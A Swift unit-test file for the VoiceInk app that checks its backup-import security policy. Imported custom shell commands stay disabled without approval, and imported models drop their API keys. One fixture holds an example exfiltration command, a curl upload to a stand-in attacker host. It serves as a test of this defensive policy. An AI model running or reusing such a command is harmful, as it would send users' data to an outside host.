import Foundation
import Testing
@testable import VoiceInk

struct BackupImportSecurityPolicyTests {
    @Test func importedCustomCommandStaysDisabledWithoutExplicitApproval() {
        let commandMode = ModeConfig(
            name: "Imported command",
            isAIEnhancementEnabled: false,
            outputMode: .customCommand,
            customCommand: ModeCustomCommand(command: "curl https://attacker.example/upload"),
            isEnabled: true,
            isDefault: true
        )

        let result = BackupImportSecurityPolicy.sanitizedModes(
            [commandMode],
            allowCustomCommands: false
        )

        #expect(result[0].customCommand?.command == commandMode.customCommand?.command)
        #expect(result[0].outputMode == .customCommand)
        #expect(result[0].isEnabled == false)
        #expect(result[0].isDefault == false)
    }

    @Test func approvedCustomCommandAndOrdinaryModesKeepTheirBehavior() {
        let commandMode = ModeConfig(
            name: "Approved command",
            isAIEnhancementEnabled: false,
            outputMode: .customCommand,
            customCommand: ModeCustomCommand(command: "open -a Notes"),
            isEnabled: true,
            isDefault: true
        )
        let pasteMode = ModeConfig(
            name: "Paste",
            isAIEnhancementEnabled: false,
            outputMode: .paste,
            isEnabled: true
        )

        let approved = BackupImportSecurityPolicy.sanitizedModes(
            [commandMode, pasteMode],
            allowCustomCommands: true
        )
        let unapproved = BackupImportSecurityPolicy.sanitizedModes(
            [commandMode, pasteMode],
            allowCustomCommands: false
        )

        #expect(approved == [commandMode, pasteMode])
        #expect(unapproved[1].isEnabled == true)
        #expect(unapproved[1].outputMode == .paste)
    }

    @Test func importedCustomModelGetsNewIdentityAndNeverImportsCredentials() throws {
        let importedID = UUID()
        let json = """
        {
          "id": "\(importedID.uuidString)",
          "name": "custom-model",
          "displayName": "Custom Model",
          "description": "Imported model",
          "apiEndpoint": "https://api.example.com/v1/audio/transcriptions",
          "modelName": "whisper-1",
          "isMultilingualModel": true,
          "supportedLanguages": {"en": "English"},
          "apiKey": "must-not-reach-keychain"
        }
        """
        let backup = try JSONDecoder().decode(CustomModelBackup.self, from: Data(json.utf8))

        let model = backup.makeImportedModel(id: UUID(uuidString: "DEADBEEF-DEAD-BEEF-DEAD-BEEFDEADBEEF")!)

        #expect(model.id == UUID(uuidString: "DEADBEEF-DEAD-BEEF-DEAD-BEEFDEADBEEF"))
        #expect(model.id != importedID)
        #expect(model.apiEndpoint == "https://api.example.com/v1/audio/transcriptions")
        #expect(model.name == "custom-model")
    }
}
